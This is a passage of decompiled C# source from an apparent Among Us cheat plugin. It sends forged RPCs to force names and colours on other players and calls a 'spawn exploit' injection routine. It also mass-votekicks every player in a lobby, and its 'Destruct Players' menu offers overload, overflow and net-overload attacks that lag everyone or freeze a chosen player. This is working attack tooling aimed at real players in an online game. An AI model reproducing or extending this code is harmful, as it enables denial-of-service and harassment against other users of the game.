                messageWriter.Write(((InnerNetObject) target).NetId);
                messageWriter.Write(str);
                ((InnerNetClient) AmongUsClient.Instance).FinishRpcImmediately(messageWriter);
                Thread.Sleep(50);
                target.RpcSetName(str);
                ++num;
              }
              catch (Exception ex)
              {
                ChocooPlugin.Logger.LogError((object) $"Error forcing name for {target.Data.PlayerName}: {ex.Message}");
              }
            }
          }
          ChocooPlugin.Logger.LogInfo((object) $"Forced name/color/size to {num.ToString()} players");
        }
      }
      catch (Exception ex)
      {
        ChocooPlugin.Logger.LogError((object) ("ForceNameToAll error: " + ex.Message));
      }
    }

    private void ApplyNameSize()
    {
      try
      {
        if (!((InnerNetClient) AmongUsClient.Instance).AmHost)
          ChocooPlugin.Logger.LogWarning((object) "You must be host to change name size");
        else if (ChocooPlugin.selectedVotekickTargetId == -1)
        {
          ChocooPlugin.Logger.LogWarning((object) "No player selected");
        }
        else
        {
          PlayerControl target = (PlayerControl) null;
          foreach (PlayerControl playerControl in PlayerControl.AllPlayerControls.ToArray())
          {
            if (Object.op_Inequality((Object) playerControl, (Object) null) && Object.op_Inequality((Object) playerControl.Data, (Object) null) && playerControl.Data.ClientId == ChocooPlugin.selectedVotekickTargetId)
            {
              target = playerControl;
              break;
            }
          }
          if (Object.op_Equality((Object) target, (Object) null))
          {
            ChocooPlugin.Logger.LogWarning((object) "Could not find player");
          }
          else
          {
            string str1 = Regex.Replace(Regex.Replace(Regex.Replace(target.Data.PlayerName, "<size=-?\\d+>", "").Replace("</size>", ""), "<color=#?[0-9A-Fa-f]{3,8}>", "").Replace("</color>", ""), "</?[^>]+>", "");
            string str2 = $"<size={this.currentNameSize.ToString()}><color={this.nameColorCodes[this.selectedNameColorIndex]}>{str1}</color></size>";
            ChocooPlugin.Logger.LogInfo((object) $"Changing name size of {target.Data.PlayerName} to: {this.currentNameSize.ToString()}");
            for (int index = 0; index < 3; ++index)
            {
              if (!SpawnExploitHelper.InjectSpawnExploitTo((InnerNetObject) target))
                ChocooPlugin.Logger.LogWarning((object) $"Spawn exploit injection attempt {(index + 1).ToString()} failed, retrying...");
            }
            Thread.Sleep(50);
            foreach (PlayerControl playerControl in PlayerControl.AllPlayerControls.ToArray())
            {
              if (Object.op_Inequality((Object) playerControl, (Object) null) && Object.op_Inequality((Object) playerControl, (Object) PlayerControl.LocalPlayer))
              {
                try
                {
                  MessageWriter messageWriter = ((InnerNetClient) AmongUsClient.Instance).StartRpcImmediately(((InnerNetObject) target).NetId, (byte) 6, (SendOption) 1, ((InnerNetClient) AmongUsClient.Instance).GetClientIdFromCharacter(playerControl));
                  messageWriter.Write(((InnerNetObject) target).NetId);
                  messageWriter.Write(str2);
                  ((InnerNetClient) AmongUsClient.Instance).FinishRpcImmediately(messageWriter);
                }
                catch (Exception ex)
                {
                  ChocooPlugin.Logger.LogWarning((object) ("Failed to send RPC to player: " + ex.Message));
                }
              }
            }
            Thread.Sleep(50);
            target.SetName(str2);
            ChocooPlugin.Logger.LogInfo((object) ("Name size changed to: " + this.currentNameSize.ToString()));
          }
        }
      }
      catch (Exception ex)
      {
        ChocooPlugin.Logger.LogError((object) ("Apply name size error: " + ex.Message));
      }
    }

    private void SendDelayedNameChange()
    {
      try
      {
        if (Object.op_Equality((Object) this.pendingForceNameTarget, (Object) null) || string.IsNullOrEmpty(this.pendingForceNameValue))
          return;
        ChocooPlugin.Logger.LogInfo((object) "Sending delayed name change RPC...");
        this.pendingForceNameTarget.RpcSetName(this.pendingForceNameValue);
        ChocooPlugin.Logger.LogInfo((object) "Name change RPC sent!");
        this.pendingForceNameTarget = (PlayerControl) null;
        this.pendingForceNameValue = (string) null;
      }
      catch (Exception ex)
      {
        ChocooPlugin.Logger.LogError((object) ("Delayed name change error: " + ex.Message));
      }
    }

    private void CopyFriendCode()
    {
      try
      {
        if (ChocooPlugin.selectedVotekickTargetId == -1)
        {
          ChocooPlugin.Logger.LogWarning((object) "No player selected to copy friend code");
        }
        else
        {
          PlayerControl playerControl1 = (PlayerControl) null;
          foreach (PlayerControl playerControl2 in PlayerControl.AllPlayerControls.ToArray())
          {
            if (Object.op_Inequality((Object) playerControl2, (Object) null) && Object.op_Inequality((Object) playerControl2.Data, (Object) null) && playerControl2.Data.ClientId == ChocooPlugin.selectedVotekickTargetId)
            {
              playerControl1 = playerControl2;
              break;
            }
          }
          if (Object.op_Equality((Object) playerControl1, (Object) null))
          {
            ChocooPlugin.Logger.LogWarning((object) "Could not find player to copy friend code");
          }
          else
          {
            string friendCode = playerControl1.Data.FriendCode;
            if (string.IsNullOrEmpty(friendCode))
            {
              ChocooPlugin.Logger.LogWarning((object) "Player has no friend code");
              if (!Object.op_Inequality((Object) DestroyableSingleton<HudManager>.Instance, (Object) null) || !Object.op_Inequality((Object) DestroyableSingleton<HudManager>.Instance.Notifier, (Object) null))
                return;
              DestroyableSingleton<HudManager>.Instance.Notifier.AddDisconnectMessage("Player has no friend code!");
            }
            else
            {
              GUIUtility.systemCopyBuffer = friendCode;
              ChocooPlugin.Logger.LogInfo((object) ("Copied friend code: " + friendCode));
              if (!Object.op_Inequality((Object) DestroyableSingleton<HudManager>.Instance, (Object) null) || !Object.op_Inequality((Object) DestroyableSingleton<HudManager>.Instance.Notifier, (Object) null))
                return;
              DestroyableSingleton<HudManager>.Instance.Notifier.AddDisconnectMessage("Friend code copied: " + friendCode);
            }
          }
        }
      }
      catch (Exception ex)
      {
        ChocooPlugin.Logger.LogError((object) ("Copy friend code error: " + ex.Message));
      }
    }

    private void CopyOutfit()
    {
      try
      {
        if (ChocooPlugin.selectedVotekickTargetId == -1)
        {
          ChocooPlugin.Logger.LogWarning((object) "No player selected to copy outfit");
        }
        else
        {
          PlayerControl playerControl1 = (PlayerControl) null;
          foreach (PlayerControl playerControl2 in PlayerControl.AllPlayerControls.ToArray())
          {
            if (Object.op_Inequality((Object) playerControl2, (Object) null) && Object.op_Inequality((Object) playerControl2.Data, (Object) null) && playerControl2.Data.ClientId == ChocooPlugin.selectedVotekickTargetId)
            {
              playerControl1 = playerControl2;
              break;
            }
          }
          if (Object.op_Equality((Object) playerControl1, (Object) null))
            ChocooPlugin.Logger.LogWarning((object) "Could not find player to copy outfit");
          else if (Object.op_Equality((Object) PlayerControl.LocalPlayer, (Object) null))
          {
            ChocooPlugin.Logger.LogWarning((object) "Local player not found");
          }
          else
          {
            NetworkedPlayerInfo.PlayerOutfit currentOutfit = playerControl1.CurrentOutfit;
            if (Object.op_Inequality((Object) AmongUsClient.Instance, (Object) null) && ((InnerNetClient) AmongUsClient.Instance).AmHost)
              PlayerControl.LocalPlayer.RpcSetColor((byte) currentOutfit.ColorId);
            else
              PlayerControl.LocalPlayer.CmdCheckColor((byte) currentOutfit.ColorId);
            PlayerControl.LocalPlayer.RpcSetNamePlate(currentOutfit.NamePlateId);
            PlayerControl.LocalPlayer.RpcSetHat(currentOutfit.HatId);
            PlayerControl.LocalPlayer.RpcSetVisor(currentOutfit.VisorId);
            PlayerControl.LocalPlayer.RpcSetSkin(currentOutfit.SkinId);
            PlayerControl.LocalPlayer.RpcSetPet(currentOutfit.PetId);
            ChocooPlugin.Logger.LogInfo((object) ("Copied outfit from " + playerControl1.Data.PlayerName));
            if (!Object.op_Inequality((Object) DestroyableSingleton<HudManager>.Instance, (Object) null) || !Object.op_Inequality((Object) DestroyableSingleton<HudManager>.Instance.Notifier, (Object) null))
              return;
            DestroyableSingleton<HudManager>.Instance.Notifier.AddDisconnectMessage($"Outfit copied from {playerControl1.Data.PlayerName}!");
          }
        }
      }
      catch (Exception ex)
      {
        ChocooPlugin.Logger.LogError((object) ("Copy outfit error: " + ex.Message));
      }
    }

    private void AddToBlacklist()
    {
      try
      {
        if (ChocooPlugin.selectedVotekickTargetId == -1)
        {
          ChocooPlugin.Logger.LogWarning((object) "No player selected to blacklist");
        }
        else
        {
          PlayerControl playerControl1 = (PlayerControl) null;
          foreach (PlayerControl playerControl2 in PlayerControl.AllPlayerControls.ToArray())
          {
            if (Object.op_Inequality((Object) playerControl2, (Object) null) && Object.op_Inequality((Object) playerControl2.Data, (Object) null) && playerControl2.Data.ClientId == ChocooPlugin.selectedVotekickTargetId)
            {
              playerControl1 = playerControl2;
              break;
            }
          }
          if (Object.op_Equality((Object) playerControl1, (Object) null))
          {
            ChocooPlugin.Logger.LogWarning((object) "Could not find player to blacklist");
          }
          else
          {
            string friendCode = playerControl1.Data.FriendCode;
            if (string.IsNullOrEmpty(friendCode))
            {
              ChocooPlugin.Logger.LogWarning((object) "Player has no friend code to blacklist");
              if (!Object.op_Inequality((Object) DestroyableSingleton<HudManager>.Instance, (Object) null) || !Object.op_Inequality((Object) DestroyableSingleton<HudManager>.Instance.Notifier, (Object) null))
                return;
              DestroyableSingleton<HudManager>.Instance.Notifier.AddDisconnectMessage("Player has no friend code!");
            }
            else if (ChocooPlugin.BlacklistedCodes.Contains(friendCode.ToLower().Trim()))
            {
              ChocooPlugin.Logger.LogWarning((object) "Player already in blacklist");
              if (!Object.op_Inequality((Object) DestroyableSingleton<HudManager>.Instance, (Object) null) || !Object.op_Inequality((Object) DestroyableSingleton<HudManager>.Instance.Notifier, (Object) null))
                return;
              DestroyableSingleton<HudManager>.Instance.Notifier.AddDisconnectMessage("Already blacklisted!");
            }
            else
            {
              ChocooPlugin.SaveToBlacklist(friendCode);
              ChocooPlugin.Logger.LogInfo((object) $"Added to blacklist: {playerControl1.Data.PlayerName} ({friendCode})");
              if (!Object.op_Inequality((Object) DestroyableSingleton<HudManager>.Instance, (Object) null) || !Object.op_Inequality((Object) DestroyableSingleton<HudManager>.Instance.Notifier, (Object) null))
                return;
              DestroyableSingleton<HudManager>.Instance.Notifier.AddDisconnectMessage("Blacklisted: " + playerControl1.Data.PlayerName);
            }
          }
        }
      }
      catch (Exception ex)
      {
        ChocooPlugin.Logger.LogError((object) ("Add to blacklist error: " + ex.Message));
      }
    }

    private void TeleportToPlayer()
    {
      try
      {
        if (ChocooPlugin.selectedVotekickTargetId == -1)
        {
          ChocooPlugin.Logger.LogWarning((object) "No player selected for teleport");
        }
        else
        {
          PlayerControl playerControl1 = (PlayerControl) null;
          foreach (PlayerControl playerControl2 in PlayerControl.AllPlayerControls.ToArray())
          {
            if (Object.op_Inequality((Object) playerControl2, (Object) null) && Object.op_Inequality((Object) playerControl2.Data, (Object) null) && playerControl2.Data.ClientId == ChocooPlugin.selectedVotekickTargetId)
            {
              playerControl1 = playerControl2;
              break;
            }
          }
          if (Object.op_Equality((Object) playerControl1, (Object) null))
          {
            ChocooPlugin.Logger.LogWarning((object) "Could not find player to teleport to");
          }
          else
          {
            if (!Object.op_Inequality((Object) PlayerControl.LocalPlayer, (Object) null))
              return;
            Vector2 truePosition = playerControl1.GetTruePosition();
            truePosition.y += 0.3636f;
            PlayerControl.LocalPlayer.NetTransform.RpcSnapTo(truePosition);
            ChocooPlugin.Logger.LogInfo((object) ("Teleported to " + playerControl1.Data.PlayerName));
          }
        }
      }
      catch (Exception ex)
      {
        ChocooPlugin.Logger.LogError((object) ("Teleport error: " + ex.Message));
      }
    }

    private void DrawVotekickSection()
    {
      this.DrawToggleSwitch("Votekick Many Players", ref ChocooPlugin.VotekickAllEnabled);
      if (ChocooPlugin.VotekickAllEnabled)
      {
        this.VotekickAll();
        GUILayout.Space(5f);
        GUI.backgroundColor = ChocooPlugin.GetRGBAccent();
        GUILayout.BeginVertical(GUIStyle.op_Implicit("box"), Array.Empty<GUILayoutOption>());
        GUI.contentColor = Color.red;
        GUILayout.Label("⚠️ AUTO-VOTEKICK ACTIVE", new GUIStyle(GUI.skin.label)
        {
          fontStyle = (FontStyle) 1,
          fontSize = 11,
          alignment = (TextAnchor) 4
        }, (Il2CppReferenceArray<GUILayoutOption>) null);
        GUI.contentColor = Color.yellow;
        GUILayout.Label("All current and new players will be votekicked!", new GUIStyle(GUI.skin.label)
        {
          fontSize = 10,
          alignment = (TextAnchor) 4
        }, (Il2CppReferenceArray<GUILayoutOption>) null);
        GUI.contentColor = Color.gray;
        GUILayout.Label($"Votekicked: {ChocooPlugin.votekickedPlayerIds.Count.ToString()} players", new GUIStyle(GUI.skin.label)
        {
          fontSize = 9,
          alignment = (TextAnchor) 4
        }, (Il2CppReferenceArray<GUILayoutOption>) null);
        GUI.contentColor = ChocooPlugin.GetRGBText();
        GUILayout.EndVertical();
        GUI.backgroundColor = ChocooPlugin.GetRGBColor();
      }
      else
        ChocooPlugin.votekickedPlayerIds.Clear();
      this.DrawToggleSwitch("Votekick All (Auto Rejoin)", ref ChocooPlugin.VotekickAutoRejoinEnabled);
      if (ChocooPlugin.VotekickAutoRejoinEnabled)
        this.VotekickAllAndRejoin();
      GUILayout.Space(10f);
      GUI.contentColor = Color.yellow;
      GUILayout.Label("Select Player to Votekick", new GUIStyle(GUI.skin.label)
      {
        fontStyle = (FontStyle) 1
      }, (Il2CppReferenceArray<GUILayoutOption>) null);
      GUI.contentColor = ChocooPlugin.GetRGBText();
      GUILayout.Space(5f);
      this.votekickScrollPosition = GUILayout.BeginScrollView(this.votekickScrollPosition, new GUILayoutOption[1]
      {
        GUILayout.Height(220f)
      });
      foreach (PlayerControl player in PlayerControl.AllPlayerControls.ToArray())
      {
        if (Object.op_Inequality((Object) player, (Object) null) && (int) player.PlayerId != (int) PlayerControl.LocalPlayer.PlayerId)
        {
          string str1 = this.StripHtmlTags(player.Data.PlayerName);
          bool flag = ChocooPlugin.selectedVotekickTargetId == player.Data.ClientId;
          string str2 = " [0/3]";
          Color color = Color.green;
          if (Object.op_Inequality((Object) VoteBanSystem.Instance, (Object) null))
          {
            int clientIdByPlayer = ChocooPlugin.ChocooMenu.GetClientIdByPlayer(player);
            int num = 0;
            Il2CppStructArray<int> il2CppStructArray;
            if (clientIdByPlayer >= 0 && VoteBanSystem.Instance.Votes.TryGetValue(clientIdByPlayer, ref il2CppStructArray))
            {
              for (int index = 0; index < ((Il2CppArrayBase<int>) il2CppStructArray).Length; ++index)
              {
                if (((Il2CppArrayBase<int>) il2CppStructArray)[index] != 0)
                  ++num;
              }
            }
            if (num >= 3)
            {
              str2 = " [KICKED]";
              color = Color.red;
            }
            else if (num == 2)
            {
              str2 = " [2/3]";
              color = Color.red;
            }
            else if (num == 1)
            {
              str2 = " [1/3]";
              // ISSUE: explicit constructor call
              ((Color) ref color).\u002Ector(1f, 0.5f, 0.0f, 1f);
            }
            else
            {
              str2 = " [0/3]";
              color = Color.green;
            }
          }
          GUI.backgroundColor = flag ? Color.yellow : new Color(0.3f, 0.3f, 0.3f, 1f);
          GUIStyle guiStyle = new GUIStyle(GUI.skin.button)
          {
            richText = true
          };
          string htmlStringRgb = ColorUtility.ToHtmlStringRGB(color);
          if (GUILayout.Button($"{str1} <color=#{htmlStringRgb}>{str2.Trim()}</color>", guiStyle, new GUILayoutOption[1]
          {
            GUILayout.Height(25f)
          }))
            ChocooPlugin.selectedVotekickTargetId = player.Data.ClientId;
          GUI.backgroundColor = ChocooPlugin.GetRGBColor();
        }
      }
      GUILayout.EndScrollView();
      GUILayout.Space(10f);
      GUI.backgroundColor = new Color(1f, 0.5f, 0.0f, 1f);
      GUI.enabled = ChocooPlugin.selectedVotekickTargetId != -1;
      if (GUILayout.Button("VOTEKICK TARGET", new GUILayoutOption[1]
      {
        GUILayout.Height(35f)
      }))
        this.VotekickTarget();
      GUI.enabled = true;
      GUI.backgroundColor = ChocooPlugin.GetRGBColor();
      GUI.backgroundColor = new Color(0.8f, 0.3f, 0.0f, 1f);
      GUI.enabled = ChocooPlugin.selectedVotekickTargetId != -1;
      if (GUILayout.Button("VOTEKICK TARGET (AUTO REJOIN)", new GUILayoutOption[1]
      {
        GUILayout.Height(35f)
      }))
        this.VotekickTargetAndRejoin();
      GUI.enabled = true;
      GUI.backgroundColor = ChocooPlugin.GetRGBColor();
    }

    private void DrawDestructTab()
    {
      GUI.contentColor = ChocooPlugin.RGBMode ? ChocooPlugin.GetRGBText() : new Color(1f, 0.2f, 0.2f);
      GUILayout.Label("Destruct Players", new GUIStyle(GUI.skin.label)
      {
        fontSize = 14,
        fontStyle = (FontStyle) 1
      }, (Il2CppReferenceArray<GUILayoutOption>) null);
      GUI.contentColor = ChocooPlugin.GetRGBText();
      GUILayout.Space(10f);
      GUILayout.BeginHorizontal((Il2CppReferenceArray<GUILayoutOption>) null);
      GUI.backgroundColor = this.activeDestructSection == "Overload" ? new Color(1f, 0.3f, 0.3f, 1f) : new Color(0.3f, 0.3f, 0.3f, 1f);
      if (GUILayout.Button("⚡ OVERLOAD", new GUIStyle(GUI.skin.button)
      {
        fontSize = 10
      }, new GUILayoutOption[2]
      {
        GUILayout.Height(32f),
        GUILayout.Width(85f)
      }))
        this.activeDestructSection = "Overload";
      GUILayout.Space(3f);
      GUI.backgroundColor = this.activeDestructSection == "Overflow" ? new Color(0.3f, 0.7f, 1f, 1f) : new Color(0.3f, 0.3f, 0.3f, 1f);
      if (GUILayout.Button("\uD83C\uDF0A OVERFLOW", new GUIStyle(GUI.skin.button)
      {
        fontSize = 10
      }, new GUILayoutOption[2]
      {
        GUILayout.Height(32f),
        GUILayout.Width(85f)
      }))
        this.activeDestructSection = "Overflow";
      GUILayout.Space(3f);
      GUI.backgroundColor = this.activeDestructSection == "Blackout" ? new Color(0.2f, 0.2f, 0.2f, 1f) : new Color(0.3f, 0.3f, 0.3f, 1f);
      if (GUILayout.Button("⚫ BLACKOUT", new GUIStyle(GUI.skin.button)
      {
        fontSize = 10
      }, new GUILayoutOption[2]
      {
        GUILayout.Height(32f),
        GUILayout.Width(85f)
      }))
        this.activeDestructSection = "Blackout";
      GUI.backgroundColor = ChocooPlugin.GetRGBColor();
      GUILayout.EndHorizontal();
      GUILayout.Space(5f);
      GUILayout.BeginHorizontal((Il2CppReferenceArray<GUILayoutOption>) null);
      GUI.backgroundColor = this.activeDestructSection == "Nullstorm" ? new Color(1f, 0.5f, 0.0f, 1f) : new Color(0.3f, 0.3f, 0.3f, 1f);
      if (GUILayout.Button("⚡ NULLSTORM", new GUIStyle(GUI.skin.button)
      {
        fontSize = 10
      }, new GUILayoutOption[2]
      {
        GUILayout.Height(32f),
        GUILayout.Width(85f)
      }))
        this.activeDestructSection = "Nullstorm";
      GUILayout.Space(3f);
      GUI.backgroundColor = this.activeDestructSection == "NetOverload" ? new Color(0.2f, 0.8f, 0.4f, 1f) : new Color(0.3f, 0.3f, 0.3f, 1f);
      if (GUILayout.Button("\uD83C\uDF10 NETOVERLOAD", new GUIStyle(GUI.skin.button)
      {
        fontSize = 10
      }, new GUILayoutOption[2]
      {
        GUILayout.Height(32f),
        GUILayout.Width(95f)
      }))
        this.activeDestructSection = "NetOverload";
      GUI.backgroundColor = ChocooPlugin.GetRGBColor();
      GUILayout.EndHorizontal();
      GUILayout.Space(15f);
      this.destroyScrollPosition = GUILayout.BeginScrollView(this.destroyScrollPosition, false, true, GUIStyle.none, GUI.skin.verticalScrollbar, Array.Empty<GUILayoutOption>());
      if (this.activeDestructSection == "Overload")
        this.DrawOverloadSection();
      else if (this.activeDestructSection == "Overflow")
        this.DrawOverflowSection();
      else if (this.activeDestructSection == "Blackout")
        this.DrawBlackoutSection();
      else if (this.activeDestructSection == "Nullstorm")
        this.DrawNullstormSection();
      else if (this.activeDestructSection == "NetOverload")
        this.DrawNetOverloadSection();
      GUILayout.EndScrollView();
    }

    private void DrawOverloadSection()
    {
      GUI.backgroundColor = ChocooPlugin.GetRGBAccent();
      GUILayout.BeginVertical(GUIStyle.op_Implicit("box"), Array.Empty<GUILayoutOption>());
      GUI.contentColor = ChocooPlugin.RGBMode ? ChocooPlugin.GetRGBText() : new Color(1f, 0.3f, 0.3f);
      GUILayout.Label("⚡ OVERLOAD ATTACKS", new GUIStyle(GUI.skin.label)
      {
        fontStyle = (FontStyle) 1,
        fontSize = 12,
        alignment = (TextAnchor) 4
      }, (Il2CppReferenceArray<GUILayoutOption>) null);
      GUI.contentColor = ChocooPlugin.GetRGBText();
      GUILayout.Space(5f);
      GUI.backgroundColor = ChocooPlugin.GetRGBAccent();
      GUILayout.Space(5f);
      GUI.backgroundColor = ChocooPlugin.OverloadMethod8Enabled ? new Color(1f, 0.3f, 0.3f, 0.3f) : ChocooPlugin.GetRGBAccent();
      if (GUILayout.Button(ChocooPlugin.OverloadMethod8Enabled ? "STOP OVERLOAD ALL" : "OVERLOAD ALL [METHOD 2]", new GUILayoutOption[1]
      {
        GUILayout.Height(40f)
      }))
      {
        ChocooPlugin.OverloadMethod8Enabled = !ChocooPlugin.OverloadMethod8Enabled;
        if (ChocooPlugin.OverloadMethod8Enabled)
          ChocooPlugin.LagEveryoneEnabled = false;
      }
      GUI.backgroundColor = ChocooPlugin.GetRGBAccent();
      GUILayout.Space(5f);
      GUI.backgroundColor = ChocooPlugin.LagEveryoneEnabled ? new Color(1f, 0.3f, 0.3f, 0.3f) : ChocooPlugin.GetRGBAccent();
      if (GUILayout.Button(ChocooPlugin.LagEveryoneEnabled ? "STOP LAG EVERYONE" : "LAG EVERYONE", new GUILayoutOption[1]
      {
        GUILayout.Height(40f)
      }))
      {
        ChocooPlugin.LagEveryoneEnabled = !ChocooPlugin.LagEveryoneEnabled;
        if (ChocooPlugin.LagEveryoneEnabled)
          ChocooPlugin.OverloadMethod8Enabled = false;
      }
      GUI.backgroundColor = ChocooPlugin.GetRGBAccent();
      GUILayout.Space(10f);
      GUI.contentColor = Color.yellow;
      GUILayout.Label("Target Specific Player", new GUIStyle(GUI.skin.label)
      {
        fontStyle = (FontStyle) 1,
        fontSize = 10
      }, (Il2CppReferenceArray<GUILayoutOption>) null);
      GUI.contentColor = ChocooPlugin.GetRGBText();
      GUILayout.Space(5f);
      GUILayout.BeginHorizontal((Il2CppReferenceArray<GUILayoutOption>) null);
      GUI.backgroundColor = ChocooPlugin.targetedOverloadMethod == 1 ? new Color(0.5f, 0.2f, 0.9f, 0.5f) : ChocooPlugin.GetRGBAccent();
      if (GUILayout.Button("Method 1", new GUILayoutOption[1]
      {
        GUILayout.Height(30f)
      }))
        ChocooPlugin.targetedOverloadMethod = 1;
      GUILayout.Space(5f);
      GUI.backgroundColor = ChocooPlugin.targetedOverloadMethod == 2 ? new Color(0.5f, 0.2f, 0.9f, 0.5f) : ChocooPlugin.GetRGBAccent();
      if (GUILayout.Button("Method 2", new GUILayoutOption[1]
      {
        GUILayout.Height(30f)
      }))
        ChocooPlugin.targetedOverloadMethod = 2;
      GUI.backgroundColor = ChocooPlugin.GetRGBAccent();
      GUILayout.EndHorizontal();
      GUILayout.Space(5f);
      this.destroyPlayerScrollPosition = GUILayout.BeginScrollView(this.destroyPlayerScrollPosition, new GUILayoutOption[1]
      {
        GUILayout.Height(100f)
      });
      foreach (PlayerControl cachedPlayer in this._cachedPlayers)
      {
        if (Object.op_Inequality((Object) cachedPlayer, (Object) null) && (int) cachedPlayer.PlayerId != (int) PlayerControl.LocalPlayer.PlayerId)
        {
          string str = cachedPlayer.Data?.PlayerName ?? "Unknown";
          GUI.backgroundColor = ChocooPlugin.selectedTargetId == ((InnerNetObject) cachedPlayer).OwnerId ? new Color(1f, 0.8f, 0.0f, 0.5f) : ChocooPlugin.GetRGBAccent();
          if (GUILayout.Button(str, new GUILayoutOption[1]
          {
            GUILayout.Height(25f)
          }))
            ChocooPlugin.selectedTargetId = ((InnerNetObject) cachedPlayer).OwnerId;
          GUI.backgroundColor = ChocooPlugin.GetRGBAccent();
        }
      }
      GUILayout.EndScrollView();
      GUILayout.Space(10f);
      GUI.backgroundColor = ChocooPlugin.TargetedOverloadEnabled ? new Color(0.5f, 0.2f, 0.9f, 0.5f) : ChocooPlugin.GetRGBAccent();
      if (GUILayout.Button(ChocooPlugin.TargetedOverloadEnabled ? "STOP OVERLOAD TARGET" : "OVERLOAD TARGET", new GUILayoutOption[1]
      {
        GUILayout.Height(35f)
      }))
      {
        ChocooPlugin.TargetedOverloadEnabled = !ChocooPlugin.TargetedOverloadEnabled;
        if (!ChocooPlugin.TargetedOverloadEnabled)
        {
          ChocooPlugin.lastMethod3OverloadTime = 0.0f;
          ChocooPlugin.ChocooMenu.lastTargetedMixMethod3Time = 0.0f;
        }
      }
      GUI.backgroundColor = ChocooPlugin.GetRGBColor();
      GUI.enabled = true;
      GUI.backgroundColor = ChocooPlugin.GetRGBAccent();
      GUILayout.EndVertical();
      GUI.backgroundColor = ChocooPlugin.GetRGBColor();
      GUILayout.Space(10f);
      GUI.backgroundColor = ChocooPlugin.GetRGBAccent();
      GUILayout.BeginVertical(GUIStyle.op_Implicit("box"), Array.Empty<GUILayoutOption>());
      GUI.contentColor = Color.red;
      GUILayout.Label("Overload Info", new GUIStyle(GUI.skin.label)
      {
        fontStyle = (FontStyle) 1
      }, (Il2CppReferenceArray<GUILayoutOption>) null);
      GUI.contentColor = Color.gray;
      GUILayout.Label("• Method 1: SDF", new GUIStyle(GUI.skin.label)
      {
        fontSize = 9
      }, (Il2CppReferenceArray<GUILayoutOption>) null);
      GUILayout.Label("• Method 2: BDT", new GUIStyle(GUI.skin.label)
      {
        fontSize = 9
      }, (Il2CppReferenceArray<GUILayoutOption>) null);
      GUILayout.Label("• Lag Everyone: Causes lag to everyone", new GUIStyle(GUI.skin.label)
      {
        fontSize = 9
      }, (Il2CppReferenceArray<GUILayoutOption>) null);
      GUILayout.Label("• Target: Freezes one player", new GUIStyle(GUI.skin.label)
      {
        fontSize = 9
      }, (Il2CppReferenceArray<GUILayoutOption>) null);
      GUI.contentColor = ChocooPlugin.GetRGBText();
      GUILayout.EndVertical();
      GUI.backgroundColor = ChocooPlugin.GetRGBColor();
    }

    private void DrawOverflowSection()
    {
      GUI.backgroundColor = ChocooPlugin.GetRGBAccent();
      GUILayout.BeginVertical(GUIStyle.op_Implicit("box"), Array.Empty<GUILayoutOption>());
      GUI.contentColor = ChocooPlugin.RGBMode ? ChocooPlugin.GetRGBText() : new Color(0.3f, 0.7f, 1f);
      GUILayout.Label("\uD83C\uDF0A OVERFLOW ATTACKS", new GUIStyle(GUI.skin.label)
      {
        fontStyle = (FontStyle) 1,
        fontSize = 12,
        alignment = (TextAnchor) 4
      }, (Il2CppReferenceArray<GUILayoutOption>) null);
      GUI.contentColor = ChocooPlugin.GetRGBText();
      GUILayout.Space(5f);
      GUI.backgroundColor = ChocooPlugin.OverflowMethod1Enabled ? new Color(0.3f, 0.7f, 1f, 0.3f) : ChocooPlugin.GetRGBAccent();
      if (GUILayout.Button(ChocooPlugin.OverflowMethod1Enabled ? "STOP OVERFLOW " : "OVERFLOW [METHOD 1]", new GUILayoutOption[1]
      {
        GUILayout.Height(40f)
      }))
      {
        ChocooPlugin.OverflowMethod1Enabled = !ChocooPlugin.OverflowMethod1Enabled;
        if (ChocooPlugin.OverflowMethod1Enabled)
          ChocooPlugin.OverflowMethod2Enabled = false;
      }
      GUI.backgroundColor = ChocooPlugin.GetRGBAccent();
      GUILayout.Space(5f);
      GUI.backgroundColor = ChocooPlugin.OverflowMethod2Enabled ? new Color(0.3f, 0.7f, 1f, 0.3f) : ChocooPlugin.GetRGBAccent();
      if (GUILayout.Button(ChocooPlugin.OverflowMethod2Enabled ? "STOP OVERFLOW " : "OVERFLOW [METHOD 2]", new GUILayoutOption[1]
      {
        GUILayout.Height(40f)
      }))
      {
        ChocooPlugin.OverflowMethod2Enabled = !ChocooPlugin.OverflowMethod2Enabled;
        if (ChocooPlugin.OverflowMethod2Enabled)
          ChocooPlugin.OverflowMethod1Enabled = false;
      }
      GUI.backgroundColor = ChocooPlugin.GetRGBAccent();
      GUILayout.Space(5f);
      GUI.backgroundColor = ChocooPlugin.OverflowMethod3Enabled ? new Color(1f, 0.5f, 0.0f, 0.3f) : ChocooPlugin.GetRGBAccent();
      if (GUILayout.Button(ChocooPlugin.OverflowMethod3Enabled ? "STOP OVERFLOW " : "OVERFLOW [METHOD 3]", new GUILayoutOption[1]
      {
        GUILayout.Height(40f)
      }))
      {
        ChocooPlugin.OverflowMethod3Enabled = !ChocooPlugin.OverflowMethod3Enabled;
        if (ChocooPlugin.OverflowMethod3Enabled)
        {
          ChocooPlugin.OverflowMethod1Enabled = false;
          ChocooPlugin.OverflowMethod2Enabled = false;
        }
      }
      GUI.backgroundColor = ChocooPlugin.GetRGBAccent();
      GUILayout.Space(5f);
      GUI.backgroundColor = ChocooPlugin.OverflowMethod4Enabled ? new Color(1f, 0.5f, 0.0f, 0.3f) : ChocooPlugin.GetRGBAccent();
      if (GUILayout.Button(ChocooPlugin.OverflowMethod4Enabled ? "STOP OVERFLOW " : "OVERFLOW [METHOD 4]", new GUILayoutOption[1]
      {
        GUILayout.Height(40f)
      }))
      {
        ChocooPlugin.OverflowMethod4Enabled = !ChocooPlugin.OverflowMethod4Enabled;
        if (ChocooPlugin.OverflowMethod4Enabled)
        {
          ChocooPlugin.OverflowMethod1Enabled = false;
          ChocooPlugin.OverflowMethod2Enabled = false;
          ChocooPlugin.OverflowMethod3Enabled = false;
        }
      }
      GUILayout.Space(5f);
      GUI.backgroundColor = ChocooPlugin.OverflowMethod5Enabled ? new Color(1f, 0.5f, 0.0f, 0.3f) : ChocooPlugin.GetRGBAccent();
      if (GUILayout.Button(ChocooPlugin.OverflowMethod5Enabled ? "STOP OVERFLOW " : "OVERFLOW [METHOD 5]", new GUILayoutOption[1]
      {
        GUILayout.Height(40f)
      }))
      {
        ChocooPlugin.OverflowMethod5Enabled = !ChocooPlugin.OverflowMethod5Enabled;
        if (ChocooPlugin.OverflowMethod5Enabled)
        {
          ChocooPlugin.OverflowMethod1Enabled = false;
          ChocooPlugin.OverflowMethod2Enabled = false;
          ChocooPlugin.OverflowMethod3Enabled = false;
          ChocooPlugin.OverflowMethod4Enabled = false;
        }
      }
      GUILayout.Space(5f);
